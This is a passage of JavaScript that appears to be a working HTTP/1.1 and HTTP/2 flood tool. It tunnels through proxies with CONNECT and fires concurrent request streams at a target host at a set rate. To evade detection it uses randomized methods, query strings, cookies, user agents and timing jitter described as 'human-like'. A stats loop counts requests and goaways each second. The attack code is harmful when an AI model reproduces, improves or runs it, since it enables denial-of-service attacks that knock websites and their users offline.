                        if (newSession && newSession.length > 0) {
                            sessionTickets.set(url.hostname, newSession);
                        }
                    }
                    
                    const userAgent = getRandomUserAgent(); // Get a random user agent from the imported list

                    if (tlsSocket.alpnProtocol === 'http/1.1') {
                        http1Payload = Buffer.concat(new Array(1).fill(buildRequest(userAgent)));
                        function doWriteHttp1() {
                            if (tlsSocket.destroyed) {
                                return;
                            }
                            tlsSocket.write(http1Payload, (err) => {
                                if (!err) {
                                    stats.requests++;
                                    // Adjusted timing for HTTP/1.1 with jitter for human-like traffic.
                                    const delay = (isFull ? 1000 : (1000 / (rate * 8))) * (1 + (Math.random() - 0.5) * JITTER_FACTOR);
                                    setTimeout(() => {
                                        doWriteHttp1()
                                    }, delay);
                                } else {
                                    stats.errors++;
                                    tlsSocket.end(() => tlsSocket.destroy())
                                }
                            })
                        }
                        doWriteHttp1()
                        tlsSocket.on('error', (e) => {
                            if (e.code && (ignoreCodes.includes(e.code) || ignoreNames.includes(e.name))) {
                                stats.errors++;
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        })
                        return;
                    }

                    let streamId = 1
                    let data = Buffer.alloc(0)
                    let hpack = new HPACK()
                    hpack.setTableSize(4096)

                    const updateWindow = Buffer.alloc(4)
                    updateWindow.writeUInt32BE(custom_update, 0)

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, custom_header],
                            [2, 0],
                            [4, custom_window],
                            [6, custom_table]
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    tlsSocket.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData])
                        while (data.length >= 9) {
                            const frame = decodeFrame(data)
                            if (frame != null) {
                                data = data.subarray(frame.length + 9)
                                if (frame.type == 4 && frame.flags == 0) {
                                    tlsSocket.write(encodeFrame(0, 4, "", 1))
                                }
                                if (frame.type == 7 || frame.type == 5) {
                                    stats.goaway++;
                                    tlsSocket.write(encodeRstStream(0, 3, 0));
                                    tlsSocket.end(() => tlsSocket.destroy());
                                }
                            } else {
                                break
                            }
                        }
                    })

                    tlsSocket.write(Buffer.concat(frames))

                    function doWriteHttp2() {
                        if (tlsSocket.destroyed) {
                            return
                        }

                        const requests = []
                        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
                        const method = methods[Math.floor(Math.random() * methods.length)];
                        const dynamicHeaders = generateDynamicHeaders(url.hostname); // Always generate dynamic headers

                        let headers = [
                            [':method', method],
                            [':authority', url.hostname],
                            [':scheme', 'https'],
                            [':path', url.pathname + (Math.random() > 0.3 ? '?' + generateRandomQueryString() : '')],
                            ['user-agent', userAgent] // Use imported UA
                        ];

                        // Add dynamic headers to HTTP/2
                        for (const headerName in dynamicHeaders) {
                            // Ensure headers are lowercase for HTTP/2
                            headers.push([headerName.toLowerCase(), dynamicHeaders[headerName]]);
                        }
                        headers.push(['cookie', `${generateAdvancedCookie()}; ${generateAdvancedCookie()}`]);

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headers)
                        ]);

                        for (let i = 0; i < options.h2ConcurrentStreams; i++) {
                            requests.push(encodeFrame(streamId + (i * 2), 1, packed, 0x25));
                        }
                        streamId += (options.h2ConcurrentStreams * 2);

                        tlsSocket.write(Buffer.concat(requests), (err) => {
                            if (!err) {
                                stats.requests += options.h2ConcurrentStreams;
                                // Apply jitter to HTTP/2 timings
                                const delay = (1000 / (rate * 12)) * (1 + (Math.random() - 0.5) * JITTER_FACTOR);
                                setTimeout(doWriteHttp2, delay);
                            } else {
                                stats.errors += options.h2ConcurrentStreams;
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }
                    doWriteHttp2();
                    tlsSocket.on('error', (e) => {
                        if (e.code && (ignoreCodes.includes(e.code) || ignoreNames.includes(e.name))) {
                            stats.errors++;
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                });
            });
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });

        netSocket.on('error', () => {
            stats.errors++;
            netSocket.destroy();
        });
    }

    setTimeout(() => {
        setInterval(() => {
            go();
        }, 1000 / (rate * 12));
    }, Math.random() * 1000);

    setInterval(() => {
        process.send({
            type: 'stats',
            requests: stats.requests,
            goaway: stats.goaway,
            success: stats.success,
            forbidden: stats.forbidden,
            errors: stats.errors
        });
        stats = {
            requests: 0,
            goaway: 0,
            success: 0,
            forbidden: 0,
            errors: 0
        };
    }, 1000);
}